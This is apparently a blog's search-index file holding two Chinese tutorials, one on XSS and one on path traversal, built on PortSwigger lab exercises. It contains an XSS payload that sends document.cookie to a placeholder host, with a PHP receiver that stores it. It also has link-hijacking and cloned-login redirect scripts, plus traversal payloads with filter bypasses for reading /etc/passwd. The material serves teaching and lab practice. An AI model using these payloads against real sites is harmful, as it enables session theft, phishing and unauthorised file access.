<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>XSS基础介绍</title>
      <link href="/2023/12/20/XSS%E5%9F%BA%E7%A1%80%E4%BB%8B%E7%BB%8D/"/>
      <url>/2023/12/20/XSS%E5%9F%BA%E7%A1%80%E4%BB%8B%E7%BB%8D/</url>
      
        <content type="html"><![CDATA[<h1 id="1-什么是-XSS"><a href="#1-什么是-XSS" class="headerlink" title="1 什么是 XSS"></a>1 什么是 XSS</h1><p>XSS, 跨站脚本漏洞，英文全称 Cross Site Script，是一种能够让黑客通过“<strong>HTML 注入</strong>”篡改网页，向其中插入<strong>恶意脚本</strong>（一般为 JS 代码），从而在用户浏览网页时，控制用户浏览器的安全威胁，也是一种类型的注入漏洞。</p><p>在一开始，利用 XSS 进行攻击的演示案例是跨域的，所以叫做“跨站脚本”，不过现在 JavaScript 的功能日益强大、网站前端也愈发复杂，是否跨域也已不重要了。</p><h1 id="2-XSS-原理"><a href="#2-XSS-原理" class="headerlink" title="2 XSS 原理"></a>2 XSS 原理</h1><p>原理，或者说过程，如图所示。<br><a data-fancybox="gallery" data-src="/images/2023/12/20/Pasted-image-20231127232816.png" data-caption=""><img src="/images/2023/12/20/Pasted-image-20231127232816.png"></a></p><h2 id="XSS-发生的条件"><a href="#XSS-发生的条件" class="headerlink" title="XSS 发生的条件"></a>XSS 发生的条件</h2><ol><li>输入 web 应用程序的数据来自一个不可靠的源，一般是 web 请求。</li><li>包含恶意代码数据未经过滤就发送给 Web 用户。</li></ol><h1 id="3-XSS-类型"><a href="#3-XSS-类型" class="headerlink" title="3 XSS 类型"></a>3 XSS 类型</h1><h2 id="3-1-Reflected-XSS"><a href="#3-1-Reflected-XSS" class="headerlink" title="3.1 Reflected XSS"></a>3.1 Reflected XSS</h2><p>Reflected XSS 即<strong>反射型 XSS</strong>。当应用接收到HTTP请求中的数据，并把数据以一种不安全的方式，如不加任何处理，简单“反射”回浏览器（<strong>the immediate response</strong>）时，就会产生反射型 XSS 漏洞。</p><p>Reflected XSS 往往需要用户点击一个恶意链接才能攻击成功，且具有一次性，所以又叫 “<strong>非持久型</strong>” XSS。</p><p>Reflected XSS 通常出现在网站的<strong>搜索栏</strong>等地方，且恶意脚本代码通常来自于**当前的 HTTP 请求 (the current HTTP request)**。</p><h3 id="举个栗子"><a href="#举个栗子" class="headerlink" title="举个栗子"></a>举个栗子</h3><p>下面以 PortSwigger XSS labs 中的一个<a href="https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded">简单例子</a>进行说明。</p><p>该 lab 使用 GET 方法通过 search 参数传输数据，且对用户输入的数据不加任何处理就直接输出到页面上。</p><p>若用户提交如下数据，“search&#x3D;1655452184”。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url: web-security-academy.net/?search=1655452184</span><br></pre></td></tr></table></figure><p>得到的结果如图所示：<br><a data-fancybox="gallery" data-src="/images/2023/12/20/Pasted-image-20231126200835.png" data-caption=""><img src="/images/2023/12/20/Pasted-image-20231126200835.png"></a></p><p>查看页面源码，有：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>0 search results for &#x27;1655452184&#x27;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure><p>如果输入如下数据：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>&#x27;</span><br></pre></td></tr></table></figure><p><a data-fancybox="gallery" data-src="/images/2023/12/20/Pasted-image-20231122232249.png" data-caption=""><img src="/images/2023/12/20/Pasted-image-20231122232249.png"></a></p><p>发现 js 脚本 <code>alert(/xss/)</code> 成功执行。</p><p><a data-fancybox="gallery" data-src="/images/2023/12/20/Pasted-image-20231122232332.png" data-caption=""><img src="/images/2023/12/20/Pasted-image-20231122232332.png"></a></p><p>再次查看网页代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span></span><br><span class="line">&quot;0 search results for &#x27;&#x27;&quot;</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&quot;&#x27;&#x27;&quot;</span><br><span class="line"><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="3-2-Stored-XSS"><a href="#3-2-Stored-XSS" class="headerlink" title="3.2 Stored XSS"></a>3.2 Stored XSS</h2><p>Stored XSS 即<strong>存储型</strong> XSS，常常出现在<strong>论坛、博客、留言板</strong>等位置，攻击者在发帖过程中嵌入 XSS 攻击代码，帖子被目标服务器存储在数据库中，当用户进行正常访问时，触发恶意代码。所以 Stored XSS 的恶意脚本代码通常来自于<strong>网站服务端的数据库</strong>。</p><p>也正是因为恶意代码被存储在服务端数据库中，所以 Stored XSS 不需要用户单击特定 URL 就能执行跨站脚本，且能存在更长时间，又称为“<strong>持久型 XSS</strong>”。</p><h3 id="举个栗子-1"><a href="#举个栗子-1" class="headerlink" title="举个栗子"></a>举个栗子</h3><p>下面以 PortSwigger XSS labs 中的一个 <a href="https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded">lab</a> 进行说明。</p><p>用户发布评论时，web 应用使用 POST 方法传输表单数据到服务端。</p><p>下图是发布评论时的报文：<br><a data-fancybox="gallery" data-src="/images/2023/12/20/Pasted-image-20231128210656.png" data-caption=""><img src="/images/2023/12/20/Pasted-image-20231128210656.png"></a><br><a data-fancybox="gallery" data-src="/images/2023/12/20/Pasted-image-20231128210637.png" data-caption=""><img src="/images/2023/12/20/Pasted-image-20231128210637.png"></a></p><p>服务端未对用户评论内容进行处理就存储在了数据库中，当用户访问网页时，数据库中的内容发送到客户端并展示。</p><p><a data-fancybox="gallery" data-src="/images/2023/12/20/Pasted-image-20231122233548.png" data-caption=""><img src="/images/2023/12/20/Pasted-image-20231122233548.png"></a></p><p>在评论中嵌入恶意代码：<code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></p><p><a data-fancybox="gallery" data-src="/images/2023/12/20/Pasted-image-20231122233735.png" data-caption=""><img src="/images/2023/12/20/Pasted-image-20231122233735.png"></a></p><p>由于恶意代码被当作评论存储在了服务端，所以我们不论什么时候访问评论区被嵌入恶意代码的博客，均会触发 XSS (<strong>持久型 XSS</strong>)</p><p><a data-fancybox="gallery" data-src="/images/2023/12/20/Pasted-image-20231122233822.png" data-caption=""><img src="/images/2023/12/20/Pasted-image-20231122233822.png"></a><br><a data-fancybox="gallery" data-src="/images/2023/12/20/Pasted-image-20231122233857.png" data-caption=""><img src="/images/2023/12/20/Pasted-image-20231122233857.png"></a></p><h2 id="3-3-DOM-based-XSS"><a href="#3-3-DOM-based-XSS" class="headerlink" title="3.3 DOM-based XSS"></a>3.3 DOM-based XSS</h2><p>DOM-based XSS，是通过修改<strong>页面的 DOM 节点</strong>形成的 XSS。当 web 应用从攻击者可控的不受信任的来源中读取数据，并将它传入<strong>动态</strong>修改页面 <strong>DOM 节点</strong>的javascript 语句时就换产生 DOM-based XSS 漏洞。</p><p>这些 javascript 语句被称为 <strong>sink</strong>，如 <code>eval()</code>, <code>innerHTML</code>, <code>window.location</code> 等。</p><p>以下列出一些可能包含 DOM-XSS 漏洞的 sink。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>()</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">writeln</span>()</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">domain</span> </span><br><span class="line">element.<span class="property">innerHTML</span> </span><br><span class="line">element.<span class="property">outerHTML</span> </span><br><span class="line">element.<span class="property">insertAdjacentHTML</span> </span><br><span class="line">element.<span class="property">onevent</span></span><br></pre></td></tr></table></figure><h3 id="举个栗子-2"><a href="#举个栗子-2" class="headerlink" title="举个栗子"></a>举个栗子</h3><p>以 PortSwigger XSS 实验中的 <a href="https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink">lab</a> 为例：</p><p>用户在搜索栏输入数据，web 应用使用 javascript 代码动态修改页面。</p><p>根据题目要求，<code>ctrl+shift+f</code> 全局搜索 <code>location.search</code>。</p><p><a data-fancybox="gallery" data-src="/images/2023/12/20/Pasted-image-20231123135504.png" data-caption=""><img src="/images/2023/12/20/Pasted-image-20231123135504.png"></a></p><p>函数 <code>trackSearch()</code> 使用 <code>document.write</code> 在上下两个 section 中写入一个 <code>&lt;img&gt;</code> 标签。<code>location.search</code> 从 url <code>https://0ae0002203c0668a84176d2100500026.web-security-academy.net/?search=1655452184</code>中拿到参数 <code>search</code> 的值并赋值给 <code>query</code>。   GET 方法</p><p><a data-fancybox="gallery" data-src="/images/2023/12/20/Pasted-image-20231123135020.png" data-caption=""><img src="/images/2023/12/20/Pasted-image-20231123135020.png"></a></p><p>如果用户输入如下恶意 js 代码： <code>&quot;&gt; &lt;script&gt;alert(/xss/)&lt;/script&gt; &quot;&lt;</code>。</p><p><a data-fancybox="gallery" data-src="/images/2023/12/20/Pasted-image-20231128215413.png" data-caption=""><img src="/images/2023/12/20/Pasted-image-20231128215413.png"></a></p><p>用户输入的数据被嵌入当作 html 标签嵌入页面中，恶意代码被执行，触发 xss。</p><p><a data-fancybox="gallery" data-src="/images/2023/12/20/Pasted-image-20231123135946.png" data-caption=""><img src="/images/2023/12/20/Pasted-image-20231123135946.png"></a></p><h1 id="4-XSS-危害"><a href="#4-XSS-危害" class="headerlink" title="4 XSS 危害"></a>4 XSS 危害</h1><h2 id="4-1-盗取-cookie，劫持会话"><a href="#4-1-盗取-cookie，劫持会话" class="headerlink" title="4.1 盗取 cookie，劫持会话"></a>4.1 盗取 cookie，劫持会话</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?uname=&lt;script&gt;document.location=&quot;http://ip/cookie.php?cookie=&quot; + document.cookie&lt;/script&gt; #</span><br></pre></td></tr></table></figure><p>exploit server 的 cookie.php 代码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cookie</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;cookie.txt&#x27;</span>, <span class="variable">$cookie</span>);</span><br></pre></td></tr></table></figure><h2 id="4-2-篡改网页链接"><a href="#4-2-篡改网页链接" class="headerlink" title="4.2 篡改网页链接"></a>4.2 篡改网页链接</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> link = <span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&quot;a&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; link.<span class="property">length</span>; j++)&#123;</span></span><br><span class="line"><span class="language-javascript">            link[j].<span class="property">href</span> = <span class="string">&quot;http://attacker-site.com/&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="4-3-盗取用户信息"><a href="#4-3-盗取用户信息" class="headerlink" title="4.3 盗取用户信息"></a>4.3 盗取用户信息</h2><p>思路：<strong>克隆网站登录页面</strong>，利用存储XSS设置跳转代码，如果用户访问，即跳转到克隆网站的登录页面，用户输入登录，账号密码被存储。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">location</span>=<span class="string">&quot;克隆网站ip&quot;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>[!question] 如何克隆网站？<br><strong>答：</strong> kali setookit！</p></blockquote><h1 id="5-XSS-测试与发现"><a href="#5-XSS-测试与发现" class="headerlink" title="5 XSS 测试与发现"></a>5 XSS 测试与发现</h1><h2 id="5-1-自动化工具"><a href="#5-1-自动化工具" class="headerlink" title="5.1 自动化工具"></a>5.1 自动化工具</h2><ol><li>Burp Suite scanner</li><li><a href="https://github.com/s0md3v/XSStrike">XSStrike</a></li></ol><h2 id="5-2-手动探测"><a href="#5-2-手动探测" class="headerlink" title="5.2 手动探测"></a>5.2 手动探测</h2><ol><li>构造一个独一无二且不会被识别为恶意代码的字符串用来提交到页面</li><li>使用浏览器审查工具进行代码审查，寻找构造的字符串是否在页面中显示，如何显示，构造的字符串在相应标签中的位置（属性还是标签内容）。</li></ol><p>主要是明确数据流以及网站处理数据的方式。</p><h1 id="6-XSS-防御"><a href="#6-XSS-防御" class="headerlink" title="6 XSS 防御"></a>6 XSS 防御</h1><p>不好意思，现在不太 care 防御手段（傲娇</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> owaspTop10 </tag>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>路径穿越基础介绍</title>
      <link href="/2023/12/17/%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E5%9F%BA%E7%A1%80%E4%BB%8B%E7%BB%8D/"/>
      <url>/2023/12/17/%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E5%9F%BA%E7%A1%80%E4%BB%8B%E7%BB%8D/</url>
      
        <content type="html"><![CDATA[<blockquote><p>你的 web 服务器不过是我的文件管理器罢了 :-\</p></blockquote><h1 id="1-什么是路径穿越"><a href="#1-什么是路径穿越" class="headerlink" title="1 什么是路径穿越"></a>1 什么是路径穿越</h1><p>路径穿越，path-traversal，也称为路径遍历、目录穿越&#x2F;遍历（directory traversal），是一种能让攻击者通过使用一些类似 <code>../</code> 的<strong>目录控制序列</strong>访问 web 服务器上<strong>任意文件</strong>的安全漏洞。</p><p>任意文件主要包括：</p><ul><li>程序源码和数据</li><li>服务端证书</li><li>敏感的系统文件，<code>/etc/passwd</code></li></ul><p>path-traversal 被 OWASP 收录的 Broken Access Control（BAC，越权访问）一栏，BAC 可是 <a href="https://owasp.org/www-project-top-ten/">OWASP Top 10</a> 2021 版中的 No.1 哦。</p><h1 id="2-测试方法"><a href="#2-测试方法" class="headerlink" title="2 测试方法"></a>2 测试方法</h1><p>寻找路径穿越漏洞分两步：</p><ol><li>输入向量枚举，定位注入点。</li><li>测试，绕过</li></ol><h2 id="2-1-不同OS的敏感文件位置"><a href="#2-1-不同OS的敏感文件位置" class="headerlink" title="2.1 不同OS的敏感文件位置"></a>2.1 不同OS的敏感文件位置</h2><p>需要了解 <strong>web app 服务端的架构、操作系统及其文件管理方式</strong>，就算存在路径穿越但你不知道你想要的文件放哪就尴尬了。</p><ul><li>Unix-like OS:<ul><li>root directory: <code>/</code></li><li>directory separator: <code>/</code></li><li>网站根目录：<code>/var/www/</code>, <code>/var/www/images/</code></li><li>常用 payload: <code>../../../etc/passwd</code></li></ul></li><li>Windows OS:<ul><li>root directory: <code>&lt;drive letter&gt;:</code></li><li>directory separator: <code>\</code> or <code>/</code></li></ul></li></ul><h2 id="2-2-举个栗子"><a href="#2-2-举个栗子" class="headerlink" title="2.2 举个栗子"></a>2.2 举个栗子</h2><p>以 PortSwigger Labs 中的一个简单<a href="https://portswigger.net/web-security/file-path-traversal/lab-simple">例子</a>进行说明：</p><p>开启 burp 再打开一个页面。</p><p><a data-fancybox="gallery" data-src="/images/2023/12/17/Pasted-image-20231209110748.png" data-caption=""><img src="/images/2023/12/17/Pasted-image-20231209110748.png"></a></p><p>观察 HTTP history，找到一个 GET 图片文件的请求，这里可能存在路径穿越。（一堆 google 自动发的包，裂开</p><p>这里能直接看到一个访问请求，我就不枚举用户输入向量了，一般情况要要测试用户所有可能的输入向量，包括 GET 和 POST 等请求。</p><p><a data-fancybox="gallery" data-src="/images/2023/12/17/Pasted-image-20231209110859.png" data-caption=""><img src="/images/2023/12/17/Pasted-image-20231209110859.png"></a></p><p>网页源码里面也能看到。</p><p><a data-fancybox="gallery" data-src="/images/2023/12/17/Pasted-image-20231209111405.png" data-caption=""><img src="/images/2023/12/17/Pasted-image-20231209111405.png"></a></p><p>发送到 Repeater 重放，测试。</p><p><a data-fancybox="gallery" data-src="/images/2023/12/17/Pasted-image-20231206224112.png" data-caption=""><img src="/images/2023/12/17/Pasted-image-20231206224112.png"></a></p><p>得到的响应报文如下，可以看到已经拿到了 <code>/etc/passwd</code> 的内容了。</p><p><a data-fancybox="gallery" data-src="/images/2023/12/17/Pasted-image-20231207222507.png" data-caption=""><img src="/images/2023/12/17/Pasted-image-20231207222507.png"></a></p><h1 id="3-常规防御与绕过"><a href="#3-常规防御与绕过" class="headerlink" title="3 常规防御与绕过"></a>3 常规防御与绕过</h1><h2 id="3-1-使用绝对路径"><a href="#3-1-使用绝对路径" class="headerlink" title="3.1 使用绝对路径"></a>3.1 使用绝对路径</h2><p>删掉所有目录遍历序列，如 <code>../</code> 等 <a href="https://portswigger.net/web-security/file-path-traversal/lab-absolute-path-bypass">no case, no learning</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=/etc/passwd</span><br></pre></td></tr></table></figure><h2 id="3-2-双写绕过"><a href="#3-2-双写绕过" class="headerlink" title="3.2 双写绕过"></a>3.2 双写绕过</h2><p>仅将 <code>../</code> 替换为空，未对替换处理后的 filename 进行二次检查(non-recursively) <a href="https://portswigger.net/web-security/file-path-traversal/lab-sequences-stripped-non-recursively">no case, no learning</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=....//..././..././etc/passwd</span><br></pre></td></tr></table></figure><h2 id="3-3-编码绕过"><a href="#3-3-编码绕过" class="headerlink" title="3.3 编码绕过"></a>3.3 编码绕过</h2><p>先放一个好用的编码工具：<a href="https://gchq.github.io/CyberChef/">CyberChef</a>。</p><p><a data-fancybox="gallery" data-src="/images/2023/12/17/Pasted-image-20231209113640.png" data-caption=""><img src="/images/2023/12/17/Pasted-image-20231209113640.png"></a></p><h3 id="3-3-1-URL-编码-与-double-URL-编码"><a href="#3-3-1-URL-编码-与-double-URL-编码" class="headerlink" title="3.3.1 URL 编码 与 double URL 编码"></a>3.3.1 URL 编码 与 double URL 编码</h3><p><code>../</code> 和 <code>..\</code> 各个部分url 编码的排列组合，我简单列几个。</p><ul><li>%2E%2E%2F –&gt; ..&#x2F;</li><li>%2E%2E&#x2F; –&gt; ..&#x2F;</li><li>..%2F –&gt; ..&#x2F;</li><li>%252E%252E%252F</li><li>..%5C –&gt; ..\</li><li>%2E%2E%5C –&gt; ..\</li><li>%252E%252E%255C –&gt; ..\</li></ul><h3 id="3-3-2-unicode-编码"><a href="#3-3-2-unicode-编码" class="headerlink" title="3.3.2 unicode 编码"></a>3.3.2 unicode 编码</h3><p><a data-fancybox="gallery" data-src="/images/2023/12/17/Pasted-image-20231209122622.png" data-caption=""><img src="/images/2023/12/17/Pasted-image-20231209122622.png"></a></p><ul><li>\u002E\u002E\u002F –&gt; ..&#x2F;</li><li>\u002E\u002E\u005C –&gt; ..\</li></ul><h3 id="3-3-3-其他非标准编码"><a href="#3-3-3-其他非标准编码" class="headerlink" title="3.3.3 其他非标准编码"></a>3.3.3 其他非标准编码</h3><ul><li>..%c0%af</li><li>..%ef%bc%8f</li></ul><h2 id="3-4-其他绕过方式"><a href="#3-4-其他绕过方式" class="headerlink" title="3.4 其他绕过方式"></a>3.4 其他绕过方式</h2><h3 id="3-4-1-00-截断"><a href="#3-4-1-00-截断" class="headerlink" title="3.4.1 %00 截断"></a>3.4.1 %00 截断</h3><p>某些情况下 web app 会验证文件的扩展名，如必须以 <code>.png</code> 结尾等。如果简单构造 <code>filename=../../../etc/passwd.png</code> 显然无法拿到我们想要的文件。</p><p>而截断机制既能绕过输入有效性验证，又能在解析文件时拿到我们想要的文件。 <a href="https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass">no case, no learning</a></p><p>%00 截断：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=../../../etc/passwd%00.jpg</span><br></pre></td></tr></table></figure><p>#todo</p><ul><li><input disabled="" type="checkbox"> 调研其他截断机制？</li></ul><h3 id="3-4-2-必须包含某些路径"><a href="#3-4-2-必须包含某些路径" class="headerlink" title="3.4.2 必须包含某些路径"></a>3.4.2 必须包含某些路径</h3><p>有些 web app 要求文件名中必须包含某些特定的目录 (base folder)，这时我们仍可以使用 <code>../</code> 拿到我们想要的内容。<a href="https://portswigger.net/web-security/file-path-traversal/lab-validate-start-of-path">no case, no learning</a> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=/var/www/images/../../../etc/passwd</span><br></pre></td></tr></table></figure><p>#todo </p><ul><li><input disabled="" type="checkbox"> 汇总常见 Payload</li></ul><h1 id="4-防御手段"><a href="#4-防御手段" class="headerlink" title="4 防御手段"></a>4 防御手段</h1><p>最有效的防御方法就是<strong>缩小攻击面</strong>，典型的例子：中国防火墙 Great Firewall。对于路径穿越的防御也同样适用，避免用户与 filesystem APIs 交互能有效减少路径穿越攻击的风险。</p><p>但大部分情况下无法避免用户提供的输入与 filesystem APIs 交互，防御方法如下：</p><ol><li>使用<strong>白名单</strong>对<strong>用户输入</strong>进行验证与过滤</li><li>使用当前操作系统路径规范化函数规范化路径后，进行过滤，最后再进行相关调用</li></ol><h1 id="5-工具"><a href="#5-工具" class="headerlink" title="5 工具"></a>5 工具</h1><p>说实话感觉这玩意手动测试的话也太麻烦了。</p><p>一些常用的工具:</p><ul><li>BurpSuite Intruder 可用这些 <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal/Intruder">字典</a> 对其进行配置</li><li><a href="https://github.com/wireghoul/dotdotpwn">DotDotPwn</a> 好久不更新了呀</li><li><a href="https://www.zaproxy.org/">OWASP ZAP</a></li><li><a href="https://github.com/xmendez/wfuzz">wfuzz</a></li></ul><p>常回来看看：</p><ul><li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings">PayloadsAllTheThings</a></li></ul><h1 id="6-参考链接"><a href="#6-参考链接" class="headerlink" title="6 参考链接"></a>6 参考链接</h1><ul><li><a href="https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/05-Authorization_Testing/01-Testing_Directory_Traversal_File_Include.md">OWASP wstg path-traversal</a></li><li><a href="https://portswigger.net/web-security/file-path-traversal">path-traversal by PortSwigger</a></li><li><a href="https://websec.readthedocs.io/zh/latest/vuln/pathtraversal.html">目录穿越</a></li><li><a href="https://code.google.com/archive/p/teenage-mutant-ninja-turtles/wikis/AdvancedObfuscationPathtraversal.wiki">Advanced Directory Traversal filter bypassing</a></li><li><a href="https://blog.csdn.net/qingzhantianxia/article/details/128204437">路径穿越（Path Traversal）详解</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> owaspTop10 </tag>
            
            <tag> path-traversal </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
